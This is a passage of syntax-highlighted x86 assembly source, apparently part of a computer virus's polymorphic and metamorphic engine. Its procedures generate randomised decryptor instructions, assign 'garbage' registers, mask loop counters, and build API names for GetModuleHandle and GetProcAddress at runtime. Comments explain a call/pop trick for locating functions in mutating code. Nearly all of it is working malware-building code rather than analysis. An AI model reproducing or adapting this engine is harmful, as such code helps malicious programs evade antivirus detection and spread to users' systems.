                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@LoopFindLabel</span><span class="sc0">      </span><span class="sc1">; at the end of the table</span><span class="sc0">
       </span><span class="sc5">@@InsertLabel</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">         </span><span class="sc1">; Set the new label</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">NumberOfLabels</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; Increase the number of</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">                     </span><span class="sc1">; labels.</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">NumberOfLabels</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
 </span><span class="sc5">@@LabelInserted</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">             </span><span class="sc1">; Return.</span><span class="sc0">
</span><span class="sc5">Poly_InsertLabel</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">;; Function to set the function name passed in the values of Index, Counter</span><span class="sc0">
</span><span class="sc1">;; and Buffer. An instruction will be created for each one (in a random order)</span><span class="sc0">
</span><span class="sc1">;; and after that another three instructions will be created for putting the</span><span class="sc0">
</span><span class="sc1">;; values of the registers into the buffer that GetModuleHandle or</span><span class="sc0">
</span><span class="sc1">;; GetProcAddres will use to get the data needed.</span><span class="sc0">
</span><span class="sc5">Poly_SetFunctionName</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Poly_SelectThreeRegisters</span><span class="sc0"> </span><span class="sc1">; Select new registers</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Poly_FirstPartOfFunction</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">IndexValue</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">       </span><span class="sc1">; Set the values</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Poly_SecondPartOfFunction</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">BufferValue</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Poly_ThirdPartOfFunction</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">CounterValue</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Poly_SetValueToRegisters</span><span class="sc0">    </span><span class="sc1">; Make MOV instructions</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Poly_SetPART_ONEtoMemory_GetStartAddress</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Poly_SetPART_TWOtoMemory_GetStartAddress</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Poly_SetPART_THREEtoMemory_GetStartAddress</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Poly_RandomCall</span><span class="sc0">       </span><span class="sc1">; Make instructions to set the</span><span class="sc0">
                                              </span><span class="sc1">; current value of the registers</span><span class="sc0">
                                              </span><span class="sc1">; to the specified buffer.</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Poly_SelectThreeRegisters</span><span class="sc0">  </span><span class="sc1">; Get three new registers</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">IndexRegister</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Poly_DoMOVRegValue</span><span class="sc0">         </span><span class="sc1">; Set a 0 at the end of</span><span class="sc0">
                                                   </span><span class="sc1">; the data set before (with</span><span class="sc0">
                                                   </span><span class="sc1">; the new created MOVs)</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">AdditionToBuffer</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Ch</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">IndexRegister</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Poly_DoMOVMemReg</span><span class="sc0">           </span><span class="sc1">; ASCIIZ (or UNICODEZ :)</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">Poly_SetFunctionName</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">


</span><span class="sc1">;; This function selects three new registers for Index, Counter and Buffer.</span><span class="sc0">
</span><span class="sc5">Poly_SelectThreeRegisters</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">IndexRegister</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">   </span><span class="sc1">; Initialize them to no_reg</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">BufferRegister</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">CounterRegister</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Poly_GetAGarbageRegister</span><span class="sc0">    </span><span class="sc1">; Get a register</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">IndexRegister</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">    </span><span class="sc1">; Set it</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Poly_GetAGarbageRegister</span><span class="sc0">    </span><span class="sc1">; Get a register</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">BufferRegister</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">   </span><span class="sc1">; Set it</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Poly_GetAGarbageRegister</span><span class="sc0">    </span><span class="sc1">; Get a register</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">CounterRegister</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">  </span><span class="sc1">; Set it</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">Poly_SelectThreeRegisters</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">;; Function to construct MOVs to set the values specified in every register</span><span class="sc0">
</span><span class="sc1">;; field to the corresponding Buffer, Counter and/or Index register.</span><span class="sc0">
</span><span class="sc5">Poly_SetValueToRegisters</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Poly_SetIndexValue_GetStartAddress</span><span class="sc0"> </span><span class="sc1">; Get the addresses</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                           </span><span class="sc1">; of the functions</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Poly_SetBufferValue_GetStartAddress</span><span class="sc0"> </span><span class="sc1">; to make a</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                            </span><span class="sc1">; random-ordered</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Poly_SetCounterValue_GetStartAddress</span><span class="sc0"> </span><span class="sc1">; call.</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Poly_RandomCall</span><span class="sc0">   </span><span class="sc1">; Make random-ordered call of</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">                       </span><span class="sc1">; the functions at EBX,ECX and EDX</span><span class="sc0">
</span><span class="sc5">Poly_SetValueToRegisters</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">;; Function to modify the counter in the decryption loop using PRIDE)</span><span class="sc0">
</span><span class="sc5">Poly_ModifyCounter</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">    </span><span class="sc1">; Add 4 plus a random 0-3. This will be</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">    </span><span class="sc1">; eliminated by the mask.</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">CounterRegister</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Poly_DoADDRegValue</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">Poly_ModifyCounter</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">;; Mask the register passed at ECX with the value in SizeOfNewCodeP2 (MOD of</span><span class="sc0">
</span><span class="sc1">;; that value)</span><span class="sc0">
</span><span class="sc5">Poly_MaskRegister</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">20h</span><span class="sc0">     </span><span class="sc1">; Make AND</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">       </span><span class="sc1">; Get a random upper bits until the one</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">SizeOfNewCodeP2</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; that we must anulate</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                    </span><span class="sc1">; (i.e. set to 0) to make</span><span class="sc0">
                </span><span class="sc6">not</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">                         </span><span class="sc1">; an effective MOD of the</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                    </span><span class="sc1">; value. All these bits</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                    </span><span class="sc1">; set to random values are</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                    </span><span class="sc1">; always 0 in the register</span><span class="sc0">
                </span><span class="sc6">neg</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">                         </span><span class="sc1">; we are masking, so there</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                    </span><span class="sc1">; is no problem.</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">Poly_MaskRegister</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">;; Mask the counter. Get the register in ECX and call the MaskRegister</span><span class="sc0">
</span><span class="sc5">Poly_MaskCounter</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">CounterRegister</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">Poly_MaskRegister</span><span class="sc0">
</span><span class="sc5">Poly_MaskCounter</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">;; Mask the index.</span><span class="sc0">
</span><span class="sc5">Poly_MaskIndex</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">IndexRegister</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">Poly_MaskRegister</span><span class="sc0">
</span><span class="sc5">Poly_MaskIndex</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">;; To modify the index, we add the addition we calculated at the beginning</span><span class="sc0">
</span><span class="sc1">;; of the polymorphism function</span><span class="sc0">
</span><span class="sc5">Poly_ModifyIndex</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Poly_Addition</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">IndexRegister</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Poly_DoADDRegValue</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">Poly_ModifyIndex</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">


</span><span class="sc5">Poly_RandomCall</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">        </span><span class="sc1">; Garble the values at EBX, ECX and EDX</span><span class="sc0">
     </span><span class="sc5">@@Again</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_GarbleRegisters</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Again</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">      </span><span class="sc1">; If 0 in any one, don't push it</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@DontPush1st</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
     </span><span class="sc5">@@DontPush1st</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@DontPush2nd</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
     </span><span class="sc5">@@DontPush2nd</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@DontPush3rd</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
     </span><span class="sc5">@@DontPush3rd</span><span class="sc4">:</span><span class="sc0">                   </span><span class="sc1">; Ret and execute the functions in that</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">                   </span><span class="sc1">; registers one after another</span><span class="sc0">
</span><span class="sc5">Poly_RandomCall</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">; To do a random-ordered calling of several functions we must know the address</span><span class="sc0">
</span><span class="sc1">; of this functions, but if we have a metamorphic code we can't do it because</span><span class="sc0">
</span><span class="sc1">; we can't make a difference between a normal value and an offset value (while</span><span class="sc0">
</span><span class="sc1">; doing LEA, or other), so we can't rely on hard-coded offsets to get function</span><span class="sc0">
</span><span class="sc1">; addresses. For this case, the idea is to put a call pointing to a POP &amp; RET</span><span class="sc0">
</span><span class="sc1">; just before the start address of the function, so the CALL automatically</span><span class="sc0">
</span><span class="sc1">; will return into the stack the starting address of the function, so calling</span><span class="sc0">
</span><span class="sc1">; to Poly_SetIndexValue_GetStartAddress() (for example) will call to the func</span><span class="sc0">
</span><span class="sc1">; Poly_RandomCall_GetAddress(), which makes a POP EAX (putting there the</span><span class="sc0">
</span><span class="sc1">; starting address of the function) and then returning to where we called</span><span class="sc0">
</span><span class="sc1">; to xxxGetStartAddress(). Easy, isn't it? No! It is easy once you know it,</span><span class="sc0">
</span><span class="sc1">; but it wasn't easy to get the idea (believe me :).</span><span class="sc0">

</span><span class="sc5">Poly_SetIndexValue_GetStartAddress</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Poly_RandomCall_GetAddress</span><span class="sc0"> </span><span class="sc1">; Get the start address</span><span class="sc0">
</span><span class="sc5">Poly_SetIndexValue</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">IndexRegister</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">IndexValue</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Poly_DoMOVRegValue</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">Poly_SetIndexValue</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">


</span><span class="sc5">Poly_SetBufferValue_GetStartAddress</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Poly_RandomCall_GetAddress</span><span class="sc0">
</span><span class="sc5">Poly_SetBufferValue</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">BufferRegister</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">BufferValue</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Poly_DoMOVRegValue</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">Poly_SetBufferValue</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">


</span><span class="sc5">Poly_SetCounterValue_GetStartAddress</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Poly_RandomCall_GetAddress</span><span class="sc0">
</span><span class="sc5">Poly_SetCounterValue</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">CounterRegister</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">CounterValue</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Poly_DoMOVRegValue</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">Poly_SetCounterValue</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">


</span><span class="sc5">Poly_RandomCall_GetAddress</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">  </span><span class="sc1">; Function where we return, POPing the</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">      </span><span class="sc1">; return address and getting the function</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">              </span><span class="sc1">; start.</span><span class="sc0">
</span><span class="sc5">Poly_RandomCall_GetAddress</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">


</span><span class="sc5">Poly_SetPART_ONEtoMemory_GetStartAddress</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Poly_RandomCall_GetAddress</span><span class="sc0">
</span><span class="sc5">Poly_SetPART_ONEtoMemory</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">IndexRegister</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">AdditionToBuffer</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Poly_DoMOVMemReg</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">Poly_SetPART_ONEtoMemory</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">Poly_SetPART_TWOtoMemory_GetStartAddress</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Poly_RandomCall_GetAddress</span><span class="sc0">
</span><span class="sc5">Poly_SetPART_TWOtoMemory</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">BufferRegister</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">AdditionToBuffer</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Poly_DoMOVMemReg</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">Poly_SetPART_TWOtoMemory</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">Poly_SetPART_THREEtoMemory_GetStartAddress</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Poly_RandomCall_GetAddress</span><span class="sc0">
</span><span class="sc5">Poly_SetPART_THREEtoMemory</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
